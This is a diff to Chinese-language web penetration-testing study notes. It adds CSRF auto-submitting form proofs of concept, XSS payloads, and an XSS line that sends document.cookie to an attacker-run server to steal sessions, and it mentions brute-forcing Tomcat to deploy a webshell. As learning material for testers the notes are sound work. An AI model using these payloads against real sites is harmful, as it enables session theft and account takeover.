@@ -12,7 +12,8 @@
 8. burpsuite拦截修改请求，如上传文件把`content-type: text/html`改成`image/png`，修改`User-Agent`。
 9. burpsuite intruder爆破爬取URL
 10. repeater多次修改请求
-11. 爆破tomcat部署webshell
+11. 用户身份在客户端请求参数中携带，如id，篡改。
+
 
 ## 安全维度
 
@@ -30,6 +31,7 @@
 - NTLM/Windows身份验证：持久连接交换challenge
 - Kerberos身份验证：Windows凭证登录
 - Bearer tokens
+- 爆破tomcat部署webshell
 
 
 ### 二、会话管理
@@ -41,6 +43,44 @@
 
 - 会话固定：构造恶意链接诱骗用户点击，使用其预设的SESSIONID
 - burp sequencer分析sessionid是否随机：获取存在set-cookie的响应，发送到sequencer，分析cookie，解码获取中的sessionid
+
+##### CSRF
+
+POC：创建一个页面，包含form指向攻击请求地址。 --> 在javascript里自动提交。 --> 诱骗受害者在同一个浏览器中访问该页面。
+
+```html tab="使用脚本自动提交"
+<form action="http://www.baidu.com" method="POST" id="csrf_form">
+    <input name="description" value="">
+</form>
+<script>
+    var form = document.getElementById("csrf_form");
+    form.submit();
+</script>
+```
+
+```html tab="在body加载时提交"
+<script>
+function dosubmit() {
+    document.getElementById(form).submit()
+}
+</script>
+<body onload=dosubmit()></body>
+```
+
+##### XSS
+
+特征：输入`<`原样显示，查看源码未做编码。
+
+POC：
+
+- `<script>alert('xss')</script>`
+- `<img src=x onerror="javascript:alert('xss')">`
+- 闭合如`<input value="输入的内容">`：`" onmouserover="javascript:alert('xss')` --> `<input value="输入的内容" onmouseover="javascript:alert('xss')">`
+- 在href属性中注入链接或者其他事件，使用户在点击的时候触发：`<a href="javascript:alert('xss')">点击我</a>`
+
+!!! example "利用XSS获取cookie"
+    启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。
+
 
 #### token
 
